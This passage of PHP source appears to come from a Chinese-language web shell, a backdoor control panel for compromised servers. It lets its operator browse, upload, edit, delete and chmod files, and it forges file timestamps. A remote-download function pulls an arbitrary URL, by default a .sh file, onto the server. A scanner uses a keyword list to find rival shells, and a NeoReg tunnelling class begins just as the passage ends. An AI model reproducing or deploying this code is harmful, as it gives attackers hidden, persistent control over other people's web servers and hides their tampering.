			$result .= '<div class="main-content package">' . self::fileAction($GLOBALS['_POST']['files'] , $GLOBALS['_POST']['type'] , $GLOBALS['_POST']['inver'] , $REAL_DIR . '/') . '</div>';
		}

		$NUM_D = $NUM_F = 0;

		if (!$_SERVER['SERVER_NAME']) $GET_URL = ''; else $GET_URL = 'http://' . $_SERVER['SERVER_NAME'] . '/';
		$ROOT_DIR = self::fileMode();

		$encode_path = base64_encode(urlencode($path));

		$result .= <<<EOF
<style>.new-file,.mine-file{position:relative;height:40px;padding:6px 12px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;outline:none;vertical-align:middle;width:100px;cursor:pointer;font-size:14px;}.mine-file{height:40px;display:inline-block;width:auto;padding:0 25px;box-sizing:border-box;line-height:40px;}table{margin-top:10px;margin-bottom:30px;width:1100px;border-spacing:0;border-collapse:collapse;}tr:nth-child(even){background:#f9f9f9;}td,th{font-size:16px;border:1px solid #ededed;padding:8px 16px;}tr td:first-child input,tr td:first-child img,tr td:first-child a{vertical-align:middle;margin:0;}tr td:first-child img{margin-left:10px;}td a{color:#666;display:inline-block;}td:last-child a{padding:0 5px;}td a:hover{text-decoration:underline;}tr:hover{background:#f5f5f5;}.small-btn{width:80px;height:30px;border-radius:4px;margin-right:10px;}.num{color:#FF6600;}.main-content{width:1100px;margin:0 auto;padding-right:30px;}.delete{color:crimson;}.edit{color:#d46464;}.download{color:cornflowerblue;}.copy{color:cadetblue;}.change-name{color:#0ab2aa;}.pack{color:lightslategrey;}.upfile-box{width:100px;height:40px;line-height:40px;color:#555;font-size:14px;cursor:pointer;border-radius:4px;position:relative;text-align:center;display:inline-block;border:1px solid #ccc;box-sizing:border-box;vertical-align:middle;}.upfile{position:absolute;top:0;left:0;opacity:0;}.package{margin-bottom:20px;}.package a{color:#9dd69f;}</style>
<div class="main-content"><form id='path_form' method='GET'>地址: <input type='hidden' name='action' value='wjdc'><input id='path_id' type='text' size='80' name='path' value='$path' width="500px"> <input type='submit' onclick="SubmitPath();" value='转到'> <a href="?action=wjdc" class='mine-file'>文件路径</a> <a href="?action=wjdc&path=$path_2" class="mine-file">上级</a></form><form method='POST' enctype="multipart/form-data" action='?action=wjbj&path=$encode_path'><input class="new-file" type="button" value="新建文件" onclick="rusurechk('file.php','?action=wjbj&path=$encode_path&type=1&name=');"> <input class="new-file"  type="button" value="新建目录" onclick="rusurechk('dir','?action=wjbj&path=$encode_path&type=2&name=');"> <div class="upfile-box">选择文件<input class="new-file upfile"  type="file" name="upfile" value="" text="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; " ></div> <input type="submit" name="upload" value="上传" >
<script>function SubmitPath(){document.getElementById('path_id').value = base64encode(document.getElementById('path_id').value);document.getElementById('path_form').submit();}</script>
EOF;

		if (!empty($GLOBALS['_POST']['newfile'])) {
			if (isset($GLOBALS['_POST']['bin'])) $bin = $GLOBALS['_POST']['bin']; else $bin = "wb";
			$newfile = Decrypt::run($GLOBALS['_POST']['newfile']);
			if (strtolower($GLOBALS['_POST']['charset']) == 'utf-8') {
				$txt = Decrypt::run($GLOBALS['_POST']['txt']);
			} else {
				$txt = $GLOBALS['_POST']['txt'];
			}
			if (substr(PHP_VERSION , 0 , 1) >= 5) {
				if ((strtolower($GLOBALS['_POST']['charset']) == 'gb2312') or (strtolower($GLOBALS['_POST']['charset']) == 'gbk')) {
					$txt = iconv("UTF-8" , "gb2312//IGNORE" , Decrypt::run($GLOBALS['_POST']['txt']));
				} else {
					$txt = self::arrayIconv($txt);
				}
			}
			$content = self::writeFile($newfile , $bin , $txt) ? $this->msg[0] : $this->msg[1];
			@touch($newfile , @strtotime($GLOBALS['_POST']['time']));
			$url = "?action=wjdc&path=" . base64_encode($this->p);
			HtmlOutput::tips($content , $url);
		}

		$current_user = get_current_user();
		$result       .= <<<EOF
</form><form method="POST" name="type" id="fileall" action="?action=wjdc&path=$path_1"><table width="100%" border=0><tr><th>文件路径</th><th>文件属性</th><th>($current_user)用户|组</th><th>修改时间</th><th>文件大小</th><th>操作</th></tr>
EOF;
		while ($dirs = @$dir->read()) {
			if ($dirs == '.' or $dirs == '..') continue;
			$dirpath = str_replace('//' , '/' , "$path/$dirs");
			if (is_dir($dirpath)) {
				$perm        = substr(base_convert(fileperms($dirpath) , 10 , 8) , - 4);
				$filetime    = @date('Y-m-d H:i:s' , @filemtime($dirpath));
				$dirpath     = base64_encode(urlencode($dirpath . '/'));
				$dir_owner   = self::getFileOwner("$path/$dirs");
				$dir_group   = self::getFileGroup("$path/$dirs");
				$img_content = HtmlOutput::getFileIcon('dir');

				$result .= <<<EOF
<tr height="25"><td><input type="checkbox" name="files[]" value="$dirs"><img src="data:image/png;base64,$img_content" border=0> <a href="?action=wjdc&path=$dirpath">$dirs</a></td><td align="center"><a href="?action=perm&path=$dirpath&chmod=$perm">$perm</a></td><td align="center">$dir_owner:$dir_group</td><td align="center">$filetime</td><td align="right"></td><td align="center"><a href="#" onClick="rusurechk('$dirs','?action=rename&path=$dirpath&newname=');return false;" class="change-name">改名</a><a href="#" onClick="rusuredel('$dirs','?action=deldir&path=$dirpath');return false;" class="delete">删除</a><a href="?action=pack&path=$dirpath" class="pack">打包</a></td></tr>
EOF;
				$NUM_D ++;
			}
		}
		@$dir->rewind();
		while ($files = @$dir->read()) {
			if ($files == '.' or $files == '..') continue;
			$filepath = self::filePathFormat("$path/$files");
			if (!is_dir($filepath)) {
				$fsize       = self::getFileSize(@filesize($filepath));
				$perm        = substr(base_convert(fileperms($filepath) , 10 , 8) , - 4);
				$filetime    = @date('Y-m-d H:i:s' , @filemtime($filepath));
				$file_urls   = str_replace(self::filePathFormat($ROOT_DIR . '/') , $GET_URL , $filepath);
				$todir       = $ROOT_DIR . '/zipfile';
				$it          = substr($filepath , - 3);
				$file_path_2 = $filepath;
				$filepath    = base64_encode(urlencode($filepath));
				$file_owner  = self::getFileOwner("$path/$files");
				$file_group  = self::getFileGroup("$path/$files");
				$img_content = HtmlOutput::getFileIcon(self::getFileType($files));
				$result      .= <<<EOF
<tr height="25"><td><input type="checkbox" name="files[]" value="$files"><img src="data:image/png;base64,$img_content" border=0> <a href="$file_urls" target="_blank">$files</a></td><td align="center"><a href="?action=perm&path=$filepath&chmod=$perm">$perm</a></td><td align="center">$file_owner:$file_group</td><td align="center">$filetime</td><td align="right"><a href="?action=down&path=$filepath" title="下载$files">$fsize</a></td><td align="center">
EOF;
				if (($it == '.gz') or ($it == 'zip') or ($it == 'tar') or ($it == '.7z'))
					$result .= '<a href="?action=unzip&path=' . $filepath . '" title="解压' . $files . '" onClick="rusurechk(\'' . $todir . '\',\'?action=unzip&path=' . $filepath . '&todir=\');return false;">解压</a>';
				else
					$result .= '<a href="?action=wjbj&path=' . $filepath . '&type=3" title="编辑' . $files . '" class="edit">编辑</a>';

				$result .= <<<EOF
<a href="#" onClick="rusurechk('$files','?action=rename&path=$filepath&newname=');return false;" class="change-name">改名</a><a href="#" onClick="rusuredel('$files','?action=delfile&path=$filepath');return false;" class="delete">删除</a><a href="#" onClick="rusurechk('$file_path_2','?action=copy&path=$filepath&newcopy=');return false;" class="copy">复制</a><a href="?action=down&path=$filepath" title="下载$files" class="download">下载</a></td></tr>
EOF;
				$NUM_F ++;
			}
		}
		@$dir->close();
		$Filetime = null;
		if (!$Filetime) $Filetime = gmdate('Y-m-d H:i:s' , time() + 3600 * 8);
		$result .= <<<END
</table><div> <input type="hidden" id="select_all" name="type" value="undefined"><input type="hidden" id="inver" name="inver" value="undefined"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> <input type="button" class="small-btn" value="复制" onclick="SubmitUrl('复制所选文件到路径: ','{$REAL_DIR}','a');return false;"><input type="button" class="small-btn" value="删除" onclick="Delok('所选文件','b');return false;"><input type="button" class="small-btn" value="属性" onclick="SubmitUrl('修改所选文件属性值为: ','0666','c');return false;"><input type="button" class="small-btn" value="时间" onclick="CheckDate('{$Filetime}','d');return false;"><input type="button" class="small-btn" value="打包" onclick="SubmitUrl('打包并下载所选文件下载名为: ','{$_SERVER['SERVER_NAME']}.zip','e');return false;">目录(<span class="num">{$NUM_D}</span>) / 文件(<span class="num">{$NUM_F}</span>)</div></form></div>
END;
		return $result;
	}

	public function fileEdit () {
		$type      = isset($GLOBALS['_GET']['type']) ? $GLOBALS['_GET']['type'] : "";
		$file_name = isset($_FILES['upfile']['name']) ? $_FILES['upfile']['name'] : "";
		$name      = isset($GLOBALS['_GET']['name']) ? Decrypt::run($GLOBALS['_GET']['name']) : "";

		$pp = urlencode(dirname($this->p));

		$result = <<<EOF
<script>
function utf16to8(str) {var out, i, len, c;out = "";len = str.length;for(i = 0; i < len; i++) {c = str.charCodeAt(i);if ((c >= 0x0001) && (c <= 0x007F)) {out += str.charAt(i);} else if (c > 0x07FF) {out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));out += String.fromCharCode(0x80 | ((c >> 6) & 0x3F));out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));} else {out += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F));out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));}}return out;}
function utf8to16(str) {var out, i, len, c;var char2, char3;out = "";len = str.length;i = 0;while(i < len) {c = str.charCodeAt(i++);switch(c >> 4) {case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:out += str.charAt(i-1);break;case 12: case 13:char2 = str.charCodeAt(i++);out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));break;case 14:char2 = str.charCodeAt(i++);char3 = str.charCodeAt(i++);out += String.fromCharCode(((c & 0x0F) << 12) |((char2 & 0x3F) << 6) |((char3 & 0x3F) << 0));break;}}return out;}
function CheckDate(){var re = document.getElementById('mtime').value;var reg = /^\d{1,4}-\d{1,2}-\d{1,2} \d{1,2}:\d{1,2}:\d{1,2}$/;var r = re.match(reg);var t = document.getElementById('charset').value;t = t.toLowerCase();if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}else{document.getElementById('newfile').value = base64encode(document.getElementById('newfile').value);if(t=="utf-8"){document.getElementById('txt').value = base64encode(utf16to8(document.getElementById('txt').value));}if(t=="gbk" || t=="gb2312"){document.getElementById('txt').value = base64encode(utf16to8(document.getElementById('txt').value));}}document.getElementById('editor').submit();}
</script>
EOF;
		if (!empty($GLOBALS['_POST']['upload'])) {
			$message_name = $file_name . ' ' . $this->msg[2];
			$content      = @copy($_FILES['upfile']['tmp_name'] , str_replace('//' , '/' , $this->p . '/' . $file_name)) ? $message_name : $this->msg[3];
			$url          = "?action=wjdc&path=" . base64_encode($this->p);
			HtmlOutput::tips($content , $url);
		}
		if (!empty($type) && $type == '2') {
			$new_dir = str_replace('//' , '/' , $this->p . '/' . $name);
			$content = @mkdir($new_dir , 0777) ? $file_name . ' ' . $this->msg[0] : $this->msg[1];
			$url     = "?action=wjdc&path=" . base64_encode($this->p);
			HtmlOutput::tips($content , $url);
		} else if (!empty($type) && $type == '1') {
			$jspath    = base64_encode(urlencode($this->p . '/' . $name));
			$pp        = base64_encode($this->p);
			$this->p   = str_replace('//' , '/' , $this->p . '/' . $name);
			$FILE_CODE = "";
			$charset   = 'UTF-8';
			$FILE_TIME = date('Y-m-d H:i:s' , time() + 3600 * 8);
			if (@file_exists($this->p)) HtmlOutput::message('发现目录下有"同名"文件' , 'echo');
		} else if (!empty($type) && $type == '3') {
			$jspath    = base64_encode(urlencode($this->p));
			$pp        = base64_encode(dirname($this->p));
			$FILE_TIME = date('Y-m-d H:i:s' , filemtime($this->p));
			$FILE_CODE = @file_get_contents($this->p);
			if (substr(PHP_VERSION , 0 , 1) >= 5) {
				if (empty($GLOBALS['_GET']['charset'])) {
					if (self::testUtf8($FILE_CODE) > 1) {
						$charset   = 'UTF-8';
						$FILE_CODE = iconv("UTF-8" , "gb2312//IGNORE" , $FILE_CODE);
					} else {
						$charset = 'GB2312';
					}
				} else {
					if ($GLOBALS['_GET']['charset'] == 'GB2312') {
						$charset = 'GB2312';
					} else {
						$charset   = $GLOBALS['_GET']['charset'];
						$FILE_CODE = iconv($GLOBALS['_GET']['charset'] , "gb2312//IGNORE" , $FILE_CODE);
					}
				}
			}
			$FILE_CODE = htmlspecialchars($FILE_CODE);
		}
		$result .= <<<END
<style>form{width:1100px;padding-right:30px;margin:0 auto;}.top-line{margin-bottom:20px;}.top-line input,.top-line select{margin-right:15px;}.top-line input.sure,.btn-box input{height:40px;border-radius:4px;box-sizing:border-box;width:80px;margin:0;}.btn-box input{height:34px;}textarea{margin-bottom:20px;}select{width:134px;}.btn-box{float:right;margin-top:3px;}.tool input[type=checkbox]{width:20px;height:20px;margin:0;}.tool *{vertical-align:middle;}.tool input[type=text]{margin-right:20px;margin-left:10px;}</style>
<form method='POST' id="editor"  action='?action=wjdc&path=$pp'><div class="top-line"><input type="text" name="newfile"  id="newfile" value="$this->p" style="width:550px;">
END;
		$result .= HtmlOutput::htmlSelect(["GB2312" => "GB2312" , "UTF-8" => "UTF-8" , "BIG5" => "BIG5" , "EUC-KR" => "EUC-KR" , "EUC-JP" => "EUC-JP" , "SHIFT-JIS" => "SHIFT-JIS" , "WINDOWS-874" => "WINDOWS-874" , "ISO-8859-1" => "ISO-8859-1"] , $charset , "onchange=\"window.location='?action=wjbj&path=$jspath&type=3&charset='+options[selectedIndex].value;\"");
		$result .= <<<END
指定编码：<input name="charset" id="charset" value="$charset" Type="text" style="width:200px;" onkeydown="if(event.keyCode==13)window.location='?action=wjbj&path=$jspath&charset='+this.value;"><input type="button" class="sure" value="确定" onclick="window.location='?action=wjbj&path=$jspath&type=3&charset='+this.form.charset.value;"></div><div><textarea name="txt" id="txt" style="width:1100px;height:380px;">$FILE_CODE</textarea></div><div class="tool"><span>文件修改时间</span><input type="text" name="time" id="mtime" value="$FILE_TIME" style="width:200px;"><input type="checkbox" name="bin" value="wb+" size="" checked><span>以二进制形式保存文件(建议使用)</span><div class="btn-box"><input type="button" value="保存" onclick="CheckDate();"> <input name='reset' type='reset' value='重置'><input type="button" value="返回" onclick="window.location='?action=wjdc&path=$pp';"></div></div></form>
END;
		return $result;
	}

	public function testUtf8 ($text) {
		if (strlen($text) < 3) return false;
		$lastch   = 0;
		$begin    = 0;
		$BOM      = true;
		$BOMchs   = [0xEF , 0xBB , 0xBF];
		$good     = 0;
		$bad      = 0;
		$notAscii = 0;
		for ($i = 0; $i < strlen($text); $i ++) {
			$ch = ord($text[$i]);
			if ($begin < 3) {
				$BOM   = ($BOMchs[$begin] == $ch);
				$begin += 1;
				continue;
			}
			if ($begin == 4 && $BOM) break;
			if ($ch >= 0x80) $notAscii ++;
			if (($ch & 0xC0) == 0x80) {
				if (($lastch & 0xC0) == 0xC0) {
					$good += 1;
				} else if (($lastch & 0x80) == 0) {
					$bad += 1;
				}
			} else if (($lastch & 0xC0) == 0xC0) {
				$bad += 1;
			}
			$lastch = $ch;
		}
		if ($begin == 4 && $BOM) {
			return 2;
		} else if ($notAscii == 0) {
			return 1;
		} else if ($good >= $bad) {
			return 2;
		} else {
			return 0;
		}
	}

	public function changePerm () {

		$result = <<<EOF
<style>
form{
width: 500px;
margin: 0  auto;
padding-right: 50px;
}
input[type=button]{
height: 40px;
    padding: 6px 12px;
    line-height: 1.42857143;
    color: #555;
    background-color: #fff;
    background-image: none;
    border: 1px solid #ccc;
    border-radius: 4px;
    outline: none;
    vertical-align: middle;
    width: 100px;
    cursor: pointer;
    font-size: 14px;
}
.btn-box{
margin-top: 30px;
	text-align: center;
}
.btn-box input:first-child{
margin-right: 20px;
}



</style>
EOF;

		$result .= "<form method='POST'><div>" . $this->p . ' 属性为: ';
		if (is_dir($this->p)) {
			$result .= HtmlOutput::htmlSelect(["0777" => "0777" , "0755" => "0755" , "0555" => "0555"] , $GLOBALS['_GET']['attr']);
		} else {
			$result .= HtmlOutput::htmlSelect(["0666" => "0666" , "0644" => "0644" , "0444" => "0444"] , $GLOBALS['_GET']['attr']);
		}
		$result .= "</div><div class='btn-box'><input type='submit' name='save' value='修改'><input type='button' value='返回' onclick='history.back();'></div>";
		if ($GLOBALS['_POST']['class']) {
			switch ($GLOBALS['_POST']['class']) {
				case "0777":
					$change = @chmod($this->p , 0777);
					break;
				case "0755":
					$change = @chmod($this->p , 0755);
					break;
				case "0555":
					$change = @chmod($this->p , 0555);
					break;
				case "0666":
					$change = @chmod($this->p , 0666);
					break;
				case "0644":
					$change = @chmod($this->p , 0644);
					break;
				case "0444":
					$change = @chmod($this->p , 0444);
					break;
			}
			$content = $change ? $this->msg[4] : $this->msg[5];
			$url     = "?action=wjdc&path=" . base64_encode(dirname($this->p));
			HtmlOutput::tips($content , $url);
		}
		$result .= "</form>";
		return $result;
	}

	public function startUnZip () {
		$to_dir = Decrypt::run($GLOBALS['_GET']['todir']) . '/';
		$zip    = new ZipArchive();
		if ($zip->open($this->p) !== true) {
			return '抱歉！压缩包无法打开或损坏';
		}
		$zip->extractTo($to_dir);
		$zip->close();
		return '解压完毕！&nbsp;&nbsp;&nbsp;<a href="?action=wjdc&path=' . base64_encode(urlencode($to_dir)) . '">进入解压目录</a>&nbsp;&nbsp;&nbsp;<a href="javascript:history.go(-1);">返回</a>';
	}

	public function pack () {
		$dir = self::getDirArray($this->p);
		$zip = new DirPack($dir);
		$out = $zip->out;
		self::downloadZip($out , $_SERVER['HTTP_HOST'] . ".zip");
	}

	public function remoteDown () {
		$target_url = isset($GLOBALS['_POST']['target']) ? Decrypt::run($GLOBALS['_POST']['target']) : 'http://website.com/down/file.sh';
		$dest_path  = isset($GLOBALS['_POST']['dest']) ? Decrypt::run($GLOBALS['_POST']['dest']) : $this->filePathFormat(THEPATH . '/file.sh');
		$result     = <<<END
<script>function submitUrl(){document.getElementById('target').value=base64encode(document.getElementById('target').value);document.getElementById('dest').value=base64encode(document.getElementById('dest').value);document.getElementById('remote').submit()}</script>
<style>#remote{position:relative;width:700px;padding-right:50px;margin:0 auto;text-align:center;}.actall{margin-bottom:30px;}.actall input[type=text]{margin-left:15px;width:500px;}.actall input[type=submit]{margin-left:30px;width:100px;height:40px;}</style>
	<form id="remote" method="POST">
    <div class="actall">超连接 <input id="target" name="target" value="{$target_url}" type="text" style="width: 370px"><input value="下载" type="submit" onclick="submitUrl()"></div>
    <div class="actall">下载到 <input id="dest" name="dest" value="{$dest_path}" type="text"></div>
    </form>
END;
		if ((!empty($GLOBALS['_POST']['target'])) && (!empty($GLOBALS['_POST']['dest']))) {
			$result   .= '<div class="actall">';
			$contents = @file_get_contents(Decrypt::run($GLOBALS['_POST']['target']));
			if (!$contents) {
				HtmlOutput::tips('无法读取要下载的数据' , '?action=bsxz');
			} else {
				$content = $this->writeFile(Decrypt::run($GLOBALS['_POST']['dest']) , 'wb' , $contents) ? '下载文件成功' : '下载文件失败';
				HtmlOutput::tips($content , '?action=bsxz');
			}
			$result .= '</div>';
		}
		return $result;
	}

	public function webShellScan () {
		$my_path = str_replace('\\' , '/' , THEPATH);
		$select  = HtmlOutput::htmlSelect(["php" => "PHP" , "asp" => "ASP" , "aspx" => "ASPX" , "jsp" => "JSP"]);
		$result  = <<<EOF
<style>.dir-box{width:700px;padding-right:50px;margin:0 auto;}.dir{position:relative;color:#333;font-size:18px;margin-bottom:20px;}.find-file{margin-top:50px;}.dir-box input[type=text]{margin-left:30px;width:595px;}.dir select{margin-left:30px;width:80px;}.dir input[type=submit]{float:right;}table{margin:0 auto;width:700px;border-spacing:0;border-collapse:collapse;}tr:hover{background:#f5f5f5;}tr:nth-child(even){background:#f9f9f9;}td{border:1px solid #ededed;padding:12px 20px;}td a{display:inline-block;width:100%;height:100%;text-align:center;color:#666;}td a:hover{text-decoration:underline;}.edit{color:#9dd69f;}.delete{color:#d46464;}</style><div class="dir-box"><div class="dir">查找功能基于关键字实现，删除功能请谨慎使用</div><form id="sendcode" method="POST"><div class="dir"><span>查找范围</span><input type="text" id="path" name="path" value="$my_path" size="40"></div><div class="dir"><span>脚本类型</span>$select<input type="submit" onclick="submitUrl()" name="passreturn" value="查找" size=""></div></form></div>
<script>function submitUrl(){document.getElementById('path').value=base64encode(document.getElementById('path').value);document.getElementById('sendcode').submit()}</script>
EOF;
		if (!empty($GLOBALS['_POST']['path'])) {
			$result .= "<div class='dir-box'><div class='dir find-file'>找到文件:</div><table><tr>";
			$show   = $this->getDirArray(Decrypt::run($GLOBALS['_POST']['path']));
			foreach ($show as $files) {
				$file_info = pathinfo($files);
				if ($file_info['extension'] == $GLOBALS['_POST']['class']) {
					$file_code = @file_get_contents($files);
					if ($this->scanFile($file_code , $GLOBALS['_POST']['class'])) {
						$files_2 = base64_encode($files);
						$result  .= <<<EOF
<td>$files</td><td><a class="edit" href="?action=wjbj&path=$files_2&type=3">编辑</a></td><td><a class="delete" href="?action=delfile&path=$files_2">删除</a></td></tr></<div></div>
EOF;
					}
				}
			}
		}
		return $result;
	}

	public function scanFile ($file_code , $file_type) {
		$dim = [
			"php"  => ["eval(" , "exec("] ,
			"asp"  => ["WScript.Shell" , "execute(" , "createtextfile("] ,
			"aspx" => ["Response.Write(eval(" , "RunCMD(" , "CreateText()"] ,
			"jsp"  => ["runtime.exec("] ,
		];
		foreach ($dim[$file_type] as $code) {
			if (stristr($file_code , $code)) return true;
		}
	}

}

class DirPack {

	var $out = '';

	function __construct ($dir) {
		if (@function_exists('gzcompress')) {
			if (count($dir) > 0) {
				foreach ($dir as $file) {
					if (is_file($file)) {
						$filecode = file_get_contents($file);
						if (is_array($dir)) $file = basename($file);
						$this->fileZip($filecode , $file);
					}
				}
				$this->out = $this->packFile();
			}
			return true;
		} else return false;
	}

	var $datasec      = [];

	var $ctrl_dir     = [];

	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";

	var $old_offset   = 0;

	function at ($atunix = 0) {
		$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
		if ($unixarr['year'] < 1980) {
			$unixarr['year']    = 1980;
			$unixarr['mon']     = 1;
			$unixarr['mday']    = 1;
			$unixarr['hours']   = 0;
			$unixarr['minutes'] = 0;
			$unixarr['seconds'] = 0;
		}
		return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) |
			($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
	}

	function fileZip ($data , $name , $time = 0) {
		$name     = str_replace('\\' , '/' , $name);
		$dtime    = dechex($this->at($time));
		$hexdtime = '\x' . $dtime[6] . $dtime[7]
			. '\x' . $dtime[4] . $dtime[5]
			. '\x' . $dtime[2] . $dtime[3]
			. '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr               = "\x50\x4b\x03\x04";
		$fr               .= "\x14\x00";
		$fr               .= "\x00\x00";
		$fr               .= "\x08\x00";
		$fr               .= $hexdtime;
		$unc_len          = strlen($data);
		$crc              = crc32($data);
		$zdata            = gzcompress($data);
		$c_len            = strlen($zdata);
		$zdata            = substr(substr($zdata , 0 , strlen($zdata) - 4) , 2);
		$fr               .= pack('V' , $crc);
		$fr               .= pack('V' , $c_len);
		$fr               .= pack('V' , $unc_len);
		$fr               .= pack('v' , strlen($name));
		$fr               .= pack('v' , 0);
		$fr               .= $name;
		$fr               .= $zdata;
		$fr               .= pack('V' , $crc);
		$fr               .= pack('V' , $c_len);
		$fr               .= pack('V' , $unc_len);
		$this->datasec[]  = $fr;
		$new_offset       = strlen(implode('' , $this->datasec));
		$cdrec            = "\x50\x4b\x01\x02";
		$cdrec            .= "\x00\x00";
		$cdrec            .= "\x14\x00";
		$cdrec            .= "\x00\x00";
		$cdrec            .= "\x08\x00";
		$cdrec            .= $hexdtime;
		$cdrec            .= pack('V' , $crc);
		$cdrec            .= pack('V' , $c_len);
		$cdrec            .= pack('V' , $unc_len);
		$cdrec            .= pack('v' , strlen($name));
		$cdrec            .= pack('v' , 0);
		$cdrec            .= pack('v' , 0);
		$cdrec            .= pack('v' , 0);
		$cdrec            .= pack('v' , 0);
		$cdrec            .= pack('V' , 32);
		$cdrec            .= pack('V' , $this->old_offset);
		$this->old_offset = $new_offset;
		$cdrec            .= $name;
		$this->ctrl_dir[] = $cdrec;
	}

	function packFile () {
		$data    = implode('' , $this->datasec);
		$ctrldir = implode('' , $this->ctrl_dir);
		return $data . $ctrldir . $this->eof_ctrl_dir . pack('v' , sizeof($this->ctrl_dir)) . pack('v' , sizeof($this->ctrl_dir)) . pack('V' , strlen($ctrldir)) . pack('V' , strlen($data)) . "\x00\x00";
	}
}

class PhpZip {

	var $file_count  = 0;

	var $datastr_len = 0;

	var $dirstr_len  = 0;

	var $filedata    = '';

	var $gzfilename;

	var $fp;

	var $dirstr      = '';

	function unix2DosTime ($unixtime = 0) {
		$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);

		if ($timearray['year'] < 1980) {
			$timearray['year']    = 1980;
			$timearray['mon']     = 1;
			$timearray['mday']    = 1;
			$timearray['hours']   = 0;
			$timearray['minutes'] = 0;
			$timearray['seconds'] = 0;
		}

		return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
			($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	}

	function startFile ($path = "web.zip") {
		$this->gzfilename = $path;
		$mypathdir        = [];
		do {
			$mypathdir[] = $path = dirname($path);
		} while ($path != '.');
		@end($mypathdir);
		do {
			$path = @current($mypathdir);
			@mkdir($path);
		} while (@prev($mypathdir));

		if ($this->fp = @fopen($this->gzfilename , "w")) {
			return true;
		}
		return false;
	}

	function addFile ($data , $name) {
		$name = str_replace('\\' , '/' , $name);

		if (strrchr($name , '/') == '/') return $this->addDir($name);

		$dtime    = dechex($this->unix2DosTime());
		$hexdtime = '\x' . $dtime[6] . $dtime[7]
			. '\x' . $dtime[4] . $dtime[5]
			. '\x' . $dtime[2] . $dtime[3]
			. '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');

		$unc_len = strlen($data);
		$crc     = crc32($data);
		$zdata   = gzcompress($data);
		$c_len   = strlen($zdata);
		$zdata   = substr(substr($zdata , 0 , strlen($zdata) - 4) , 2);

		$datastr = "\x50\x4b\x03\x04";
		$datastr .= "\x14\x00";
		$datastr .= "\x00\x00";
		$datastr .= "\x08\x00";
		$datastr .= $hexdtime;
		$datastr .= pack('V' , $crc);
		$datastr .= pack('V' , $c_len);
		$datastr .= pack('V' , $unc_len);
		$datastr .= pack('v' , strlen($name));
		$datastr .= pack('v' , 0);
		$datastr .= $name;
		$datastr .= $zdata;
		$datastr .= pack('V' , $crc);
		$datastr .= pack('V' , $c_len);
		$datastr .= pack('V' , $unc_len);

		fwrite($this->fp , $datastr);
		$my_datastr_len = strlen($datastr);
		unset($datastr);

		$dirstr = "\x50\x4b\x01\x02";
		$dirstr .= "\x00\x00";
		$dirstr .= "\x14\x00";
		$dirstr .= "\x00\x00";
		$dirstr .= "\x08\x00";
		$dirstr .= $hexdtime;
		$dirstr .= pack('V' , $crc);
		$dirstr .= pack('V' , $c_len);
		$dirstr .= pack('V' , $unc_len);
		$dirstr .= pack('v' , strlen($name));
		$dirstr .= pack('v' , 0);
		$dirstr .= pack('v' , 0);
		$dirstr .= pack('v' , 0);
		$dirstr .= pack('v' , 0);
		$dirstr .= pack('V' , 32);
		$dirstr .= pack('V' , $this->datastr_len);
		$dirstr .= $name;

		$this->dirstr .= $dirstr;

		$this->file_count ++;
		$this->dirstr_len  += strlen($dirstr);
		$this->datastr_len += $my_datastr_len;
	}

	function addDir ($name) {
		$name    = str_replace("\\" , "/" , $name);
		$datastr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";

		$datastr .= pack("V" , 0) . pack("V" , 0) . pack("V" , 0) . pack("v" , strlen($name));
		$datastr .= pack("v" , 0) . $name . pack("V" , 0) . pack("V" , 0) . pack("V" , 0);

		fwrite($this->fp , $datastr);
		$my_datastr_len = strlen($datastr);
		unset($datastr);

		$dirstr = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";
		$dirstr .= pack("V" , 0) . pack("V" , 0) . pack("V" , 0) . pack("v" , strlen($name));
		$dirstr .= pack("v" , 0) . pack("v" , 0) . pack("v" , 0) . pack("v" , 0);
		$dirstr .= pack("V" , 16) . pack("V" , $this->datastr_len) . $name;

		$this->dirstr .= $dirstr;

		$this->file_count ++;
		$this->dirstr_len  += strlen($dirstr);
		$this->datastr_len += $my_datastr_len;
	}

	function createFile () {
		$endstr = "\x50\x4b\x05\x06\x00\x00\x00\x00" .
			pack('v' , $this->file_count) .
			pack('v' , $this->file_count) .
			pack('V' , $this->dirstr_len) .
			pack('V' , $this->datastr_len) .
			"\x00\x00";

		fwrite($this->fp , $this->dirstr . $endstr);
		fclose($this->fp);
	}
}

class NeoReg {

	public function __construct () {
		ini_set("allow_url_fopen" , true);
		ini_set("allow_url_include" , true);
	}

	public function html () {
		$result = <<<EOF
<style>.sug-box{width:700px;padding-right:50px;margin:0 auto;}.sug{font-size:18px;color:#333;line-height:30px;margin-bottom:30px;}.sug a{font-size:17px;color:#9dd69f;}.sug a:hover{text-decoration:underline;}.sug-content{color:#666;font-size:18px;line-height:30px;}.active{display:block;margin-top:10px;background-color:#f8f8f8;padding:10px 20px;color:#666;margin-bottom:30px;border-radius:4px;border:1px solid #ccc;}</style>
